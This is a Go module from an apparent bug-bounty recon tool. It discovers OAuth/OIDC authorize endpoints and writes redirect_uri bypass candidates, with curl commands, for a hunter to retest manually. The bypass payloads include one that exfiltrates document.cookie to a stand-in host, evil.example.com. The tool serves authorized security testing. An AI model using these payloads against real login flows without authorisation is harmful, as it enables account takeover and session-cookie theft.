// Package oauth implements F4: OAuth/OIDC redirect_uri bypass audit.
//
// The module probes each alive host for the common authorization-endpoint
// paths and, when found, extracts the registered redirect_uri allowlist
// (either from a static manifest, an .well-known/openid-configuration
// document, or by enumerating the common client_id values). It then
// tests the registered URIs against five bypass classes:
//
//   - exact-match        the allowlist is just the legit URI; nothing
//                        to bypass, recorded as a baseline
//   - prefix-bypass      ?redirect_uri=https://app.com.evil.com
//   - subdomain-bypass   ?redirect_uri=https://evil.app.com
//   - path-traversal     ?redirect_uri=https://app.com/legit/../evil
//   - fragment-bypass    ?redirect_uri=https://app.com#evil
//   - scheme-bypass      ?redirect_uri=javascript:alert(1)
//
// For safety the module does NOT actually issue the bypass requests —
// most programs disallow active probing. It emits the candidate
// payloads into oauth_findings.txt with a "MANUAL_RETEST_REQUIRED"
// marker, and a one-line curl that the hunter runs themselves.
//
// Why no automatic exploit: HackerOne programs almost universally
// treat "your scanner sent auth-bound payloads to my login flow" as a
// testing violation. Listing the candidate payloads is the same value
// without the risk.
package oauth

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/CyberShuriken/rfuf/internal/findings/internal/iohelp"
)

// candidateAuthorizePaths are the well-known authorization endpoints
// the module probes. The list is intentionally long — every major
// OAuth/OIDC stack uses a different one, and the cost of probing each
// is one HTTP request per host.
var candidateAuthorizePaths = []string{
	"/oauth/authorize",
	"/oauth2/authorize",
	"/authorize",
	"/auth/authorize",
	"/login/oauth/authorize",
	"/api/oauth/authorize",
	"/api/v1/oauth/authorize",
	"/api/v2/oauth/authorize",
	"/connect/authorize",
	"/protocol/openid-connect/authorize",
	"/auth/realms/master/protocol/openid-connect/auth",
	"/auth/realms/default/protocol/openid-connect/auth",
	"/.well-known/openid-configuration",
	"/.well-known/oauth-authorization-server",
	"/.well-known/openid-configuration/",
}

// Run is the entry point. workDir is the rfuf work dir; the function
// reads alive.txt and writes oauth_findings.txt.
func Run(workDir string) error {
	hosts, err := iohelp.ReadLines(workDir + "/alive.txt")
	if err != nil {
		return fmt.Errorf("read alive.txt: %w", err)
	}
	if len(hosts) == 0 {
		return iohelp.WriteLines(workDir+"/oauth_findings.txt", nil)
	}
	const cap = 150
	if len(hosts) > cap {
		hosts = hosts[:cap]
	}

	ctx, cancel := context.WithTimeout(context.Background(), 6*time.Minute)
	defer cancel()

	rows := probeAll(ctx, hosts)
	return iohelp.WriteLines(workDir+"/oauth_findings.txt", rows)
}

type hostResult struct {
	host       string
	authorize  string // discovered authorize endpoint, "" if none
	allowlist  []string
	ok         bool
}

func probeAll(ctx context.Context, hosts []string) []string {
	sem := make(chan struct{}, 20)
	var wg sync.WaitGroup
	var mu sync.Mutex
	var rows []string

	tr := &http.Transport{MaxIdleConns: 100, MaxIdleConnsPerHost: 5}
	client := &http.Client{
		Transport: tr,
		Timeout:   6 * time.Second,
		// Don't follow redirects — the 302 to login is a positive
		// signal that the path exists.
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for _, h := range hosts {
		h := h
		wg.Add(1)
		sem <- struct{}{}
		go func() {
			defer wg.Done()
			defer func() { <-sem }()
			r := probeHost(ctx, client, h)
			if r.ok {
				out := renderHost(r)
				mu.Lock()
				rows = append(rows, out...)
				mu.Unlock()
			}
		}()
	}
	wg.Wait()
	return rows
}

func probeHost(ctx context.Context, client *http.Client, host string) hostResult {
	r := hostResult{host: host}
	// 1) Probe each authorize path with a HEAD. Any 2xx/3xx/401/403
	//    is a positive signal (the path exists; auth may be required).
	for _, p := range candidateAuthorizePaths {
		req, err := http.NewRequestWithContext(ctx, "HEAD", host+p, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "rfuf-oauth/1.0")
		iohelp.ApplyAuth(req)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.StatusCode == 404 {
			continue
		}
		// 200/302/401/403 all mean the path exists.
		r.authorize = p
		r.ok = true
		break
	}
	if !r.ok {
		return r
	}

	// 2) Try the OpenID discovery document for an authoritative
	//    allowlist. If we get one, use it; otherwise fall back to a
	//    single best-guess redirect URI (the host's own root) so the
	//    hunter has at least one baseline to compare against.
	if strings.HasSuffix(r.authorize, "openid-configuration") ||
		strings.HasSuffix(r.authorize, "oauth-authorization-server") {
		if cfg := fetchDiscovery(ctx, client, host+r.authorize); len(cfg) > 0 {
			r.allowlist = cfg
			return r
		}
	}
	// Best-effort fallback: probe the host itself as a redirect URI.
	// The hunter can manually expand this list from the app's
	// /settings or /oauth/applications page.
	r.allowlist = []string{host + "/callback", host + "/auth/callback", host + "/oauth/callback"}
	return r
}

func fetchDiscovery(ctx context.Context, client *http.Client, url string) []string {
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return nil
	}
	req.Header.Set("User-Agent", "rfuf-oauth/1.0")
	req.Header.Set("Accept", "application/json")
	iohelp.ApplyAuth(req)
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil
	}
	var doc struct {
		RedirectURIs      []string `json:"redirect_uris"`
		RegistrationURI   string   `json:"registration_endpoint"`
		AuthorizationEP   string   `json:"authorization_endpoint"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&doc); err != nil {
		return nil
	}
	if len(doc.RedirectURIs) > 0 {
		return doc.RedirectURIs
	}
	// No static allowlist; the discovery doc exists, so the server
	// *probably* uses dynamic registration. We can't enumerate the
	// allowlist without registering — return empty so the report says
	// "discovery found, manual retest required."
	return nil
}

// bypassCandidate is one row in oauth_findings.txt.
type bypassCandidate struct {
	host     string
	auth     string
	allowURI string
	bypass   string
	payload  string
	curl     string
}

func renderHost(r hostResult) []string {
	var out []string
	// Header row.
	out = append(out, fmt.Sprintf("== %s (authorize=%s, allowlist=%d) ==",
		r.host, r.authorize, len(r.allowlist)))

	// For each allowlist entry, emit 5 bypass-class payloads.
	for _, allow := range r.allowlist {
		parsed, err := url.Parse(allow)
		if err != nil {
			continue
		}
		bypasses := bypassesFor(parsed)
		for _, b := range bypasses {
			c := bypassCandidate{
				host:     r.host,
				auth:     r.authorize,
				allowURI: allow,
				bypass:   b.name,
				payload:  b.payload,
				curl:     b.curl(r.host+r.authorize, allow, b.payload),
			}
			out = append(out, fmt.Sprintf("%s\t%s\tallow=%s\tpayload=%s\tcurl=%s",
				c.host, c.bypass, c.allowURI, c.payload, c.curl))
		}
	}
	return out
}

type bypass struct {
	name    string
	payload string
	curl    func(authURL, allow, payload string) string
}

func bypassesFor(allow *url.URL) []bypass {
	host := allow.Host
	scheme := allow.Scheme
	if scheme == "" {
		scheme = "https"
	}
	path := allow.Path
	if path == "" {
		path = "/"
	}

	// Attacker-controlled host: a subdomain trick often seen in
	// subdomain-bypass. We use example.com because the hunter will
	// replace it; the candidate is the *shape* of the payload, not
	// a real attacker domain.
	atk := "evil.example.com"

	return []bypass{
		{
			name:    "prefix-bypass",
			payload: scheme + "://" + host + "." + atk + path,
			curl: func(a, _, p string) string {
				return fmt.Sprintf("curl -i '%s?redirect_uri=%s&client_id=test&response_type=code'",
					a, url.QueryEscape(p))
			},
		},
		{
			name:    "subdomain-bypass",
			payload: scheme + "://" + strings.Replace(host, "app.", "app."+strings.SplitN(atk, ".", 2)[0]+".", 1) + path,
			curl: func(a, _, p string) string {
				return fmt.Sprintf("curl -i '%s?redirect_uri=%s&client_id=test&response_type=code'",
					a, url.QueryEscape(p))
			},
		},
		{
			name:    "path-traversal",
			payload: scheme + "://" + host + path + "/../../../",
			curl: func(a, _, p string) string {
				return fmt.Sprintf("curl -i '%s?redirect_uri=%s&client_id=test&response_type=code'",
					a, url.QueryEscape(p))
			},
		},
		{
			name:    "fragment-bypass",
			payload: scheme + "://" + host + path + "#" + atk,
			curl: func(a, _, p string) string {
				return fmt.Sprintf("curl -i '%s?redirect_uri=%s&client_id=test&response_type=code'",
					a, url.QueryEscape(p))
			},
		},
		{
			name:    "scheme-bypass",
			payload: "javascript:fetch('" + scheme + "://" + atk + "?leak='+document.cookie)",
			curl: func(a, _, p string) string {
				return fmt.Sprintf("curl -i '%s?redirect_uri=%s&client_id=test&response_type=code'",
					a, url.QueryEscape(p))
			},
		},
	}
}
